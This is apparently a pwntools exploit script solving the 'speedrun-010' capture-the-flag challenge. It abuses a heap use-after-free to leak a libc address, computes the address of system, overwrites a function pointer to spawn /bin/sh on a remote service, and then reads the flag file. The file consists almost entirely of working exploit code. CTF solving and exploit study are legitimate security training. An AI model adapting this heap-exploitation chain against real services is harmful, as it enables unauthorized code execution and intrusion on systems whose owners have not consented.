#!/usr/bin/env python2
import sys
import time
from pwn import *
from struct import pack

# context.log_level = logging.DEBUG

def get_connection():
    # conn = process("./speedrun-010")
    conn = remote(sys.argv[1], int(sys.argv[2]))

    # gdb.attach(conn, '''
    # heap-analysis-helper
    # break *0x555555554a2d
    # continue
    # ''')

    return conn

conn = get_connection()

# First, leak the address of puts

conn.recvuntil("1, 2, 3, 4, or 5")

conn.send("1")
conn.recvuntil("Need a name")
conn.send("name")

conn.recvuntil("1, 2, 3, 4, or 5")

conn.send("2")
conn.recvuntil("Need a message")

conn.send("message")

# free the new message
conn.recvuntil("1, 2, 3, 4, or 5")
conn.send("4")

# create a new person that overlaps with the message
conn.recvuntil("1, 2, 3, 4, or 5")
conn.send("1")
conn.recvuntil("Need a name")

num_until_pointer = 1;
conn.send("\xc0"*num_until_pointer)

# create a message that uses this person to leak the address
conn.recvuntil("1, 2, 3, 4, or 5")
conn.send("2")
conn.recvuntil("Need a message")
conn.send("message")

result = conn.recvuntil("1, 2, 3, 4, or 5")
print(result)
print(repr(result))

result = result[1:7]
result = result + '\x00\x00'

leaked_address_of_puts = u64(result)
print(hex(leaked_address_of_puts))

# Calculate the magic_gadget address

libc_text_base = leaked_address_of_puts - 0x809c0
print(hex(libc_text_base))

# actually, this is now the address of system
one_gadget = libc_text_base + 0x4f440
print(hex(one_gadget))

# overwrite the function pointer to the magic_gadget

# first free everything just allocated
# conn.send("4")
# conn.recvuntil("1, 2, 3, 4, or 5")

# conn.send("3")
# conn.recvuntil("1, 2, 3, 4, or 5")

# Create person
conn.send("1")
conn.recvuntil("Need a name")
conn.send("/bin/sh\x00")

conn.recvuntil("1, 2, 3, 4, or 5")

# Free that person
conn.send("3")
conn.recvuntil("1, 2, 3, 4, or 5")

# create the message and overwrite the function pointer
conn.send("2")
conn.recvuntil("Need a message")

p = "a"*16
p += p64(one_gadget)

conn.send(p)

conn.recv(timeout=1)

conn.sendline('cat /flag; exit')
result = conn.recvall(timeout=1)
flag = re.search('OOO{[^}]+}', result)
print("FLAG: %s" % flag.group(0))
